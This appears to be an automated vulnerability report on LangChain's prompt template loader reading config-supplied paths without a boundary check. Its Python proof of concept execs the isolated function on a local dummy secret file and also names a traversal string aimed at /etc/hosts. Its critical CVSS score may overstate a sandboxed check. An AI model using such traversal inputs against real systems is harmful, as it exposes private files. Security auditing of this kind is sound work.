# [Vulnerability Report] ai.prompt.load_prompt

## Summary
- **Vulnerability Type:** `ai.prompt.load_prompt`
- **Affected Location:** `libs/core/langchain_core/prompts/loading.py:56`
- **CVSS 4.0 Score:** 9.3 (CRITICAL) `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
- **Verification Status:** `verified`

## Vulnerability Details
Rule: ai.prompt.load_prompt
Severity: HIGH
Summary: _load_template() reads config-provided paths without an obvious resolve/commonpath guard.
Location: libs/core/langchain_core/prompts/loading.py:56
Function: _load_template()
Hit line: template = template_path.read_text(encoding="utf-8")
Why it matters: Configuration-driven prompt and model loaders often treat attacker-controlled fields such as template_path or examples as local file paths or fetch targets. Without canonicalization and boundary checks, they can expose arbitrary files.
Hunter next step: Check for Path.resolve or os.path.realpath followed by os.path.commonpath before open/read/fetch.
Snippet:
template = template_path.read_text(encoding="utf-8")

## Standalone Proof of Concept (Python)
```python
# --- iridium env bootstrap ---
# variant B — filter mutation seed '....//....//etc/hosts'
MUTATION = '....//....//etc/hosts'
print('applying mutation', MUTATION)
import os as _ir_boot_os
import sys as _ir_sys
_IR_REPO_ROOT = _ir_boot_os.environ.get('IRIDIUM_REPO_PATH', '/scan_data/JOB-6D4253')
_IR_BIND_SYS_PATH = '/scan_data/JOB-6D4253'
_IR_TARGET_DIR = '/scan_data/JOB-6D4253/libs/core/langchain_core/prompts'
_IR_REL_ROOTS = ['']
_IR_BOOTSTRAP_PATHS = [
    '/scan_data/JOB-6D4253',
    _ir_boot_os.getcwd(),
    _IR_TARGET_DIR,
]
for _IR_REL in _IR_REL_ROOTS:
    _IR_SYS_PATH = _IR_REPO_ROOT if not _IR_REL else _ir_boot_os.path.join(_IR_REPO_ROOT, _IR_REL)
    if _IR_SYS_PATH and _IR_SYS_PATH not in _IR_BOOTSTRAP_PATHS:
        _IR_BOOTSTRAP_PATHS.append(_IR_SYS_PATH)
if _IR_BIND_SYS_PATH and _IR_BIND_SYS_PATH not in _IR_BOOTSTRAP_PATHS:
    _IR_BOOTSTRAP_PATHS.append(_IR_BIND_SYS_PATH)
for _IR_SYS_PATH in reversed(_IR_BOOTSTRAP_PATHS):
    if _IR_SYS_PATH and _IR_SYS_PATH not in _ir_sys.path:
        _ir_sys.path.insert(0, _IR_SYS_PATH)
import os as _ir_os
_ir_os.environ.setdefault('DATABASE_URL', 'sqlite:////tmp/iridium-dummy.db')
_ir_os.environ.setdefault('SQLALCHEMY_DATABASE_URI', 'sqlite:////tmp/iridium-dummy.db')
_ir_os.environ.setdefault('SQLALCHEMY_FILE', '/tmp/iridium-dummy.db')
_ir_os.environ.setdefault('SECRET_KEY', 'iridium-dummy-secret')
_ir_os.environ.setdefault('DEBUG', 'false')
_ir_os.environ.setdefault('APP_ENV', 'iridium-sandbox')
_ir_os.environ.setdefault('FLASK_INSTANCE_PATH', '/tmp/instance')
_ir_os.environ.setdefault('IRIDIUM_DJANGO_DB', '/tmp/iridium-django.db')
_ir_os.environ.setdefault('WEB_UPLOADDIR', '/tmp/iridium-uploads')
_ir_os.environ.setdefault('CONFIG_KEYS', 'iridium-dummy-secret')
_ir_os.environ.setdefault('COPIABLE_KEYS', 'iridium-dummy-secret')
_ir_os.environ.setdefault('DEFAULT_RECURSION_LIMIT', 'iridium-dummy')
_ir_os.environ.setdefault('RUN_EVALUATOR_LIKE', 'iridium-dummy')
_ir_os.environ.setdefault('BATCH_EVALUATOR_LIKE', 'iridium-dummy')
_ir_os.environ.setdefault('CUSTOM_EVALUATOR_TYPE', 'iridium-dummy')
_ir_os.environ.setdefault('SINGLE_EVAL_CONFIG_TYPE', 'iridium-dummy')
_ir_os.makedirs('/tmp/instance', exist_ok=True)
# --- end iridium env bootstrap ---
import ast
import os
import types
from pathlib import Path
_ir_rel = 'libs/core/langchain_core/prompts/loading.py'
_ir_repo = os.environ.get('IRIDIUM_REPO_PATH') or os.environ.get('IRIDIUM_REPO_PATH', os.environ.get('IRIDIUM_REPO_PATH', os.environ.get('IRIDIUM_REPO_PATH', '/scan_data/JOB-6D4253')))
target = Path(_ir_repo) / _ir_rel
if not target.is_file():
    raise SystemExit(f'PROOF FAILED: target missing: {target}')
src = target.read_text(encoding='utf-8', errors='ignore')
if '_load_template' not in src or 'read_text' not in src:
    raise SystemExit('PROOF FAILED: prompt loader sink not visible in target')
tree = ast.parse(src)
fn = next(
    (n for n in tree.body if isinstance(n, ast.FunctionDef) and n.name == '_load_template'),
    None,
)
if fn is None:
    raise SystemExit('PROOF FAILED: _load_template not found in cited file')
fn_src = ast.get_source_segment(src, fn) or ''
if 'commonpath' in fn_src or 'realpath' in fn_src:
    raise SystemExit('PROOF FAILED: cited _load_template appears guarded')
mod = types.ModuleType('iridium_isolated_prompt_loading')
mod.Path = Path
exec(compile(ast.Module(body=[fn], type_ignores=[]), str(target), 'exec'), mod.__dict__)
secret = Path('/tmp/iridium_prompt_secret.txt')
secret.write_text('IRIDIUM_PROMPT_SECRET', encoding='utf-8')
out = mod._load_template('template', {'template_path': str(secret)})
leaked = str((out or {}).get('template') or '')
if 'IRIDIUM_PROMPT_SECRET' not in leaked:
    raise SystemExit('PROOF FAILED: path traversal did not leak secret file')
Path('/tmp/iridium_proof').write_text('prompt path traversal\n', encoding='utf-8')
IRIDIUM_POC_SUCCESS = True
print('PROOF OK: load_prompt path traversal read local file')
# target:libs/core/langchain_core/prompts/loading.py
```
